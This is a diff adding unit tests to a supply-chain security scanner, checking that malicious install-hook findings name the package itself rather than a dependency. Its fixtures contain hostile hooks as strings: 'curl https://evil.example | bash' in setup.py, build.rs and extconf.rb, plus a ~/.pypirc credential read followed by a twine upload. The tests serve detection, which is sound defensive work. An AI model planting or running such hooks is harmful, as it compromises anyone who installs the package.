@@ -22,6 +22,7 @@ from packages.sca.models import (
     PinStyle,
 )
 from packages.sca.supply_chain import (
+    cargo_build_scripts,
     composer_lifecycle_hooks,
     python_lifecycle_hooks,
     rubygems_lifecycle_hooks,
@@ -277,3 +278,138 @@ def test_rubygems_mkrf_conf_also_scanned(tmp_path: Path) -> None:
     )
     findings = rubygems_lifecycle_hooks.scan_target(tmp_path, [], [])
     assert any(f.severity == "high" for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# Host attribution — the hook belongs to the PACKAGE, never to a dep
+# it declares (dep ordering is scanned-repo-controlled)
+# ---------------------------------------------------------------------------
+
+def test_python_host_is_package_own_name_not_first_dep(
+    tmp_path: Path,
+) -> None:
+    py = tmp_path / "pyproject.toml"
+    py.write_text(
+        "[project]\nname = 'victim'\nversion = '2.0.0'\n",
+        encoding="utf-8",
+    )
+    setup_py = tmp_path / "setup.py"
+    setup_py.write_text(
+        "import os\nos.system('curl https://evil.example | bash')\n",
+        encoding="utf-8",
+    )
+    findings = python_lifecycle_hooks.scan_manifests(
+        [_manifest(py, "PyPI")],
+        [_dep("innocent-dep", "PyPI", declared_in=py)],
+    )
+    assert len(findings) == 1
+    assert findings[0].dependency.name == "victim"
+    assert findings[0].dependency.version == "2.0.0"
+
+
+def test_python_worm_suppression_keys_on_own_name_not_first_dep(
+    tmp_path: Path,
+) -> None:
+    """A project whose FIRST DECLARED DEP is a publish helper (``np``
+    is on the allowlist) must NOT have its own credential-read +
+    publish hook finding suppressed — the suppression is for when the
+    package ITSELF is a publish helper."""
+    py = tmp_path / "pyproject.toml"
+    py.write_text("[project]\nname = 'victim'\n", encoding="utf-8")
+    setup_py = tmp_path / "setup.py"
+    setup_py.write_text(
+        "import subprocess\n"
+        "subprocess.run(['cat', '~/.pypirc'])\n"
+        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
+        encoding="utf-8",
+    )
+    findings = python_lifecycle_hooks.scan_manifests(
+        [_manifest(py, "PyPI")],
+        [_dep("np", "PyPI", declared_in=py)],
+    )
+    assert len(findings) == 1
+    assert "self-replication" in findings[0].confidence.reason
+
+
+def test_python_worm_suppression_applies_when_package_is_helper(
+    tmp_path: Path,
+) -> None:
+    py = tmp_path / "pyproject.toml"
+    py.write_text("[project]\nname = 'np'\n", encoding="utf-8")
+    setup_py = tmp_path / "setup.py"
+    setup_py.write_text(
+        "import subprocess\n"
+        "subprocess.run(['cat', '~/.pypirc'])\n"
+        "subprocess.run(['twine', 'upload', 'dist/*'])\n",
+        encoding="utf-8",
+    )
+    findings = python_lifecycle_hooks.scan_manifests(
+        [_manifest(py, "PyPI")], [],
+    )
+    assert findings == []
+
+
+def test_cargo_host_is_crate_own_name_not_first_dep(
+    tmp_path: Path,
+) -> None:
+    ct = tmp_path / "Cargo.toml"
+    ct.write_text(
+        '[package]\nname = "victim-crate"\nversion = "0.3.0"\n'
+        '[dependencies]\nserde = "1"\n',
+        encoding="utf-8",
+    )
+    (tmp_path / "build.rs").write_text(
+        'fn main() { std::process::Command::new("sh")'
+        '.arg("-c").arg("curl https://evil.example | bash")'
+        '.status().unwrap(); }\n',
+        encoding="utf-8",
+    )
+    findings = cargo_build_scripts.scan_manifests(
+        [_manifest(ct, "Cargo")],
+        [_dep("serde", "Cargo", declared_in=ct)],
+    )
+    assert len(findings) == 1
+    assert findings[0].dependency.name == "victim-crate"
+    assert findings[0].dependency.version == "0.3.0"
+
+
+def test_rubygems_host_uses_gemspec_own_name(tmp_path: Path) -> None:
+    gemspec = tmp_path / "victim-gem.gemspec"
+    gemspec.write_text(
+        'Gem::Specification.new do |s|\n'
+        '  s.name = "victim-gem"\n  s.version = "1.2.0"\n'
+        'end\n',
+        encoding="utf-8",
+    )
+    ext_dir = tmp_path / "ext" / "victim"
+    ext_dir.mkdir(parents=True)
+    (ext_dir / "extconf.rb").write_text(
+        'system("curl https://evil.example | bash")\n',
+        encoding="utf-8",
+    )
+    findings = rubygems_lifecycle_hooks.scan_target(
+        tmp_path,
+        [_manifest(gemspec, "RubyGems")],
+        [_dep("innocent-dep", "RubyGems", declared_in=gemspec)],
+    )
+    assert findings
+    assert all(f.dependency.name == "victim-gem" for f in findings)
+
+
+def test_orphan_commit_host_is_package_own_name(tmp_path: Path) -> None:
+    from packages.sca.supply_chain import orphan_commit_dep
+
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "name": "victim-pkg",
+        "version": "3.0.0",
+        "optionalDependencies": {
+            "@antv/setup": "github:antvis/G2#" + "1" * 40,
+        },
+    }), encoding="utf-8")
+    findings = orphan_commit_dep.scan_manifests(
+        [_manifest(pkg, "npm")],
+        [_dep("innocent-dep", "npm", declared_in=pkg)],
+    )
+    assert findings
+    assert all(f.dependency.name == "victim-pkg" for f in findings)
